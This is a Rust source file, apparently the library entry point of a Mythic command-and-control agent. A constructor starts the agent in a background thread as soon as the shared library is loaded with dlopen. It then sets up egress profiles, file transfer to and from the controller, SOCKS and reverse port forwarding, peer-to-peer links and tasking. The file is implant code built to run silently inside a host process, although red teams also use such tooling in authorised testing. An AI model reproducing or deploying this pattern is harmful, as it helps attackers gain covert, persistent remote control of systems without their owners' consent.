#![allow(dead_code)]

pub mod commands;
pub mod profiles;
pub mod responses;
pub mod structs;
pub mod tasks;
pub mod utils;

/// Auto-start the agent when the shared library is loaded via dlopen.
/// Spawns a background thread so that dlopen() returns immediately.
#[ctor::ctor]
fn on_load() {
    std::thread::spawn(|| {
        run_main();
    });
}

/// Entry point for shared library mode.
#[no_mangle]
pub extern "C" fn run_main() {
    let rt = tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");
    rt.block_on(async {
        // 1. Initialize egress and bind profiles
        profiles::initialize();

        // 2. Initialize responses
        let response_channels = responses::initialize(profiles::get_push_channel);

        // 3. Initialize P2P system
        let p2p_channels = utils::p2p::initialize(
            response_channels.p2p_connection_message_tx.clone(),
            profiles::get_mythic_id,
        );

        // 4. Initialize file transfer system
        let (send_file_tx, get_file_tx) = utils::files::initialize();

        // 5. Initialize task system
        tasks::initialize(tasks::TaskChannels {
            new_response_tx: response_channels.new_response_tx.clone(),
            send_file_to_mythic_tx: send_file_tx,
            get_file_from_mythic_tx: get_file_tx,
            add_internal_connection_tx: p2p_channels.add_connection_tx,
            remove_internal_connection_tx: p2p_channels.remove_connection_tx,
            interactive_task_output_tx: response_channels.new_interactive_task_output_tx.clone(),
            new_alert_tx: response_channels.new_alert_tx.clone(),
            from_mythic_socks_tx: response_channels.from_mythic_socks_tx.clone(),
            from_mythic_rpfwd_tx: response_channels.from_mythic_rpfwd_tx.clone(),
        });

        // 6. Start running egress profiles
        profiles::start().await;
    });
}
